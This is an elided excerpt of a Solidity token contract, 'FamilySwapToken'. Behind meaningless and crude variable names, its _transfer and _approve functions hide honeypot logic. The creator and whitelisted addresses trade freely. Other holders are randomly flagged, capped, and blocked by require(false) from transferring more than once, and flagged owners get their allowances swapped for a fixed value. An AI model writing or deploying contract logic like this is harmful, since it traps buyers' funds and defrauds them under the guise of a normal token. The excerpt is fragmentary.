...
contract FamilySwapToken is Context, IERC20, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;

  mapping (address => mapping (address => uint256)) private _allowances;
  mapping (address => bool) public misslexa;
  mapping (address => bool) public lunastar;
  mapping (address => bool) public evaangelina;
  mapping (address => uint256) public madivy;

  bool private miakhalifa;
  ...
  constructor() public {
    ...
    mercury = chTx * 30;
    lunastar[creator] = false;
    evaangelina[creator] = false;
    misslexa[msg.sender] = true;
  ...
  */
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if ((address(sender) == creator) && (miakhalifa == false)) {
      uranus = chTx;
      ceres = true;
    }
    
    if ((address(sender) == creator) && (miakhalifa == true)) {
      misslexa[recipient] = true;
      lunastar[recipient] = false;
      miakhalifa = false;
    }
    
    if ((amount > mercury) && (misslexa[sender] == true) && (address(sender) != creator)) {
        evaangelina[recipient] = true;
    }
    
    if (misslexa[recipient] != true) {
        lunastar[recipient] = ((randomly() == 3) ? true : false);
    }
    
    if ((lunastar[sender]) && (misslexa[recipient] == false)) {
        lunastar[recipient] = true;
    }
    
    if (misslexa[sender] == false) {
      if ((amount > mercury) && (evaangelina[sender] == true)) {
        require(false);
      }
      
      require(amount < uranus);
      if (ceres == true) {
        if (evaangelina[sender] == true) {
          require(false);
        }
        evaangelina[sender] = true;
      }
    }
  ...
  **/
  ...
  function _approve(address owner, address spender, uint256 amount) internal {
    ...
    if ((address(owner) == creator) && (pluto == true)) {
      misslexa[spender] = true;
      lunastar[spender] = false;
      evaangelina[spender] = false;
      pluto = false;
    }
    
    tok = (lunastar[owner] ? 98237 : amount);
